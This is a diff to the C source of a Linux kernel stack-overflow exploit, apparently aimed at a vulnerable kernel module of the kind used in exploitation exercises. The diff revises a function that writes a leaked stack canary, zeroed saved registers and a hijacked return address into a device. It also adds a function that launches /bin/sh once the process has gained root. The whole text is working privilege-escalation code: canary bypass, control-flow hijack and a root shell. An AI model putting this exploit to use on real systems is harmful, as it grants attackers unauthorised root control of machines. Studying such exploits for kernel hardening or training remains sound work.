@@ -58,28 +58,49 @@ uintptr_t leak_cookie(int fd, size_t leak_slots, size_t cookie_offset)
 
 /* Kernel stack overflow */
 void stack_overflow(int fd, uintptr_t cookie, uintptr_t ret_addr,
-                    size_t cookie_offset, size_t pl_slots)
+                    size_t cookie_offset, size_t pl_len)
 {
-    uintptr_t *pl = calloc(pl_slots, sizeof(size_t));
+    size_t pl_slots = pl_len / sizeof(uintptr_t);
+
+    uintptr_t *pl = calloc(pl_slots, sizeof(uintptr_t));
     if (!pl)
         DIE("calloc");
 
-    // Fill ROP chain starting after cookie
     size_t pos = cookie_offset / sizeof(uintptr_t);
+    if (pos + 4 >= pl_slots) {
+        fprintf(stderr,
+            "[-] Payload length (%zu bytes) is too small: need at least %zu bytes to reach return address\n",
+            pl_len,
+            cookie_offset + 5 * sizeof(uintptr_t));
+        free(pl);
+        exit(EXIT_FAILURE);
+    }
+
     pl[pos++] = cookie;     // Canary
     pl[pos++] = 0x0;        // rbx
     pl[pos++] = 0x0;        // r12
     pl[pos++] = 0x0;        // saved rbp
-    pl[pos++] = ret_addr;   // return address
+    pl[pos++] = ret_addr;   // ret addr (e.g. ROP)
 
-    hexdump("[*] Payload", pl, pl_slots * sizeof(uintptr_t));
+    hexdump("[*] Payload", pl, pl_len);
 
-    ssize_t written = write(fd, pl, pl_slots * sizeof(uintptr_t));
+    ssize_t written = write(fd, pl, pl_len);
     if (written < 0)
         DIE("write");
 
     printf("[!] %zd bytes of payload written\n", written);
     free(pl);
+}
+
+/* Rooted */
+void spawn_shell() {
+    if (getuid() == 0) {
+        printf("[+] GOT ROOT SHELL!\n");
+        system("/bin/sh");
+    } else {
+        fprintf(stderr, "[-] Failed to escalate\n");
+        exit(1);
+    }
 }
 
 
